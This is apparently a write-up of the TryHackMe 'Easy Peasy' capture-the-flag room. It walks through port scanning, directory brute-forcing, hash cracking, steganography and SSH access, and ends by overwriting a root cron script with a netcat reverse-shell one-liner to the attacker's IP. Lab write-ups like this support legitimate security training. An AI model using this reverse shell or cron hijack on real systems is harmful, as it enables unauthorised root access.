---
description: https://tryhackme.com/room/easypeasyctf
---

# Easy Peasy

## ****:map: **Nmap**

### **How many ports are open?**

```
nmap -p- -v 10.10.9.93
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 21-55-45.png>)

### **What is the version of nginx?**

```
nmap -sV -p80 10.10.9.93
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 21-01-23.png>)

### **What is running on the highest port?**

```
nmap -sV -p65524 10.10.9.93
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 21-55-01.png>)

#### port 6498

```
nmap -sV -p6498 10.10.9.93
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 21-57-06.png>)

## :space\_invader: Compromising the machine

### **Using GoBuster, find flag 1**

```
gobuster dir -u http://10.10.9.93/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t64
gobuster dir -u http://10.10.9.93/hidden \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t64
curl http://10.10.9.93/hidden/whatever/
echo -n 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 21-11-31.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-21 21-25-06.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-21 21-20-43.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-21 21-23-16.png>)

### **Further enumerate the machine, what is flag 2?**

```
curl http://10.10.9.93:65524/robots.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 23-09-08.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-21 23-06-28.png>)

### **What is the flag 3?**

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-34-11.png>)

### **What is the hidden directory?**

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-01-06.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-02-41.png>)

### **Using the wordlist that provided to you in this task crack the hash** **what is the password?**

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-03-28.png>)

```
echo -n '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81' > hash.txt
sort -u easypeasy.txt -o easypeasy.txt
john --format=gost --wordlist=easypeasy.txt hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-07-04.png>)

### **What is the password to login to the machine via SSH?**

```
wget http://10.10.9.93:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
steghide extract -sf binarycodepixabay.jpg
cat secrettext.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-11-42.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-14-35.png>)

### **What is the user flag?**

```bash
ssh -p6498 boring@10.10.9.93 cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-48-01.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-16-30.png>)

### **What is the root flag?**

```
nc -nvlp 4444
# ls -a /root
# cat /root/.root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-24-16.png>)

```
cat /etc/crontab
ls -l /var/www/.mysecretcronjob.sh
echo -e '#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.101.193 4444 >/tmp/f' > /var/www/.mysecretcronjob.sh
```

![](<../../.gitbook/assets/Screenshot from 2020-09-21 22-21-23.png>)

